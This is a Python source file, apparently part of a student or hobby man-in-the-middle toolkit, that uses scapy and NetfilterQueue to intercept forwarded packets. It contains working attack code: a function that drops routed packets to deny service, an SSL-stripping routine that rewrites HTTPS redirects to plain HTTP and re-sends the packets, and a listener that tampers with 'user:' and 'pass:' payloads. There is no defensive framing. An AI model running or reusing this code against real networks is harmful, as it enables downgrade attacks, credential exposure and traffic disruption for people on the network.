from scapy.all import Ether, TCP, IP, UDP, Raw, wrpcap, send 
from networking import *
from netfilterqueue import NetfilterQueue
import os

class Packet_Handler:
    def __init__(self, file_name: str):
        self.file_name = file_name
        self.pkt_lst = []

    # Input: Scapy Packet
    def add(self, scapy_pkt):
        self.pkt_lst.append(scapy_pkt)
    
    def write_to_file(self):
        with open(self.file_name, 'w') as file:
            # Convert to scapy_packet & write to file
            for i, pkt in enumerate(self.pkt_lst):
                file.write(f"\n--- Packet {i + 1}: " + pkt.summary() + " ---\n")
                file.write(pkt.show(dump=True))
                file.write(f"\n--- Packet {i + 1}: End ---\n")

# Input: Routed packet
# Description: Print & accept packets that are being forwarded through the device
def print_packet(pkt):
    # Get packet payload
    scapy_pkt = IP(pkt.get_payload())
    print(scapy_pkt.show())

# Input: Routed packet
# Description: Deny service by dropping packets on route
def dos(pkt):
    print("Packet dropped: ", pkt)
    pkt.drop()

# Input: Scapy packet
# Return decoded packet raw load
def get_dprl(pkt):
    try: return pkt[Raw].load.decode()
    except: pass

# Input: Routed packet
# Description: Perform SSL Stripping
def ssl_strip(pkt, pkt_handler):
    gateway_ip = get_default_gateway_ip()
    gateway_mac = get_mac_address(gateway_ip)

    
    try:
        scapy_pkt = IP(pkt.get_payload())
        decoded_pkt = scapy_pkt[Raw].load.decode()

        # if TCP in scapy_pkt and scapy_pkt[TCP].dport == 80 and "Upgrade-Insecure-Requests" in str(scapy_pkt[Raw].load) and scapy_pkt[Ether].dst == gateway_mac:
        '''
        if "Upgrade-Insecure-Requests" in str(scapy_pkt[Raw].load):
            print("Prev_Load:", scapy_pkt[Raw].load)

            tmp_pkt_load = decoded_pkt.replace("Upgrade-Insecure-Requests: 1", "Upgrade-Insecure-Requests: 0")
            new_pkt_load = tmp_pkt_load.encode()
            # scapy_pkt[Raw].load = new_pkt_load

            # pkt.set_payload(scapy_pkt[Raw].load)
            pkt.set_payload(bytes(new_pkt_load))
        '''
        if "Location: https://" in decoded_pkt:
            print("Prev_Load:", scapy_pkt[Raw].load)

            tmp_pkt_load = decoded_pkt.replace("https://", "http://")

            ip = IP(src=scapy_pkt.src, dst=scapy_pkt.dst)
            tcp = TCP(sport=scapy_pkt[TCP].sport, dport=scapy_pkt.dport, flags="PA")

            packet = ip/tcp/tmp_pkt_load

            packet[IP].chksum = None
            packet[TCP].chksum = None  

            print("New_Load:", packet)
            print(packet[Raw].load)
            
            pkt_handler.add(packet)
            pkt.drop()
            send(packet)
            
        else:
            pkt_handler.add(scapy_pkt)
            pkt.accept()
            print("New_Load:", pkt.get_payload())

            
    except:
        pkt_handler.add(scapy_pkt)
        pkt.accept()
        print("New_Load:", pkt.get_payload())
        #pass

    #print("New_Load:", pkt.get_payload())
    #pkt_handler.add(scapy_pkt)
    #pkt.accept()

# Input: Scapy packet capture
# Description: Creates a packet_log.pcap file & a more detailed packet_log.txt file
def writeCapture(capture):
    print("\nSaving capture...")
    wrpcap("packet_log.pcap", capture)

    with open("packet_log.txt", "w") as text_file:
        for i, packet in enumerate(capture):
            text_file.write(f"\n--- Packet {i + 1}: " + packet.summary() + " ---\n")
            text_file.write(packet.show(dump=True))
            text_file.write(f"\n--- Packet {i + 1}: End ---\n")

# Input: Scapy packet capture
# Description: Displays scapy packet capture
def displayCapture(capture):
    for i, packet in enumerate(capture):
        print(f"\n--- Packet {i + 1}: " + packet.summary() + " ---\n")
        print(packet.show())
        print(f"\n--- Packet {i + 1}: End ---\n")

# Scapy / Nfqueue example
def packet_listener(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer("UDP"):
        if scapy_packet.haslayer("Raw") and scapy_packet[UDP].dport == 25:
            if "user:" in scapy_packet[Raw].load.decode('latin-1').lower():
                scapy_packet[Raw].load = b"USER:lolz"
    
    if "pass:" in scapy_packet[Raw].load.decode('latin-1').lower():
        scapy_packet[Raw].load = b"pass:lolz"
    
    packet.set_payload(bytes(scapy_packet))
    packet.accept()
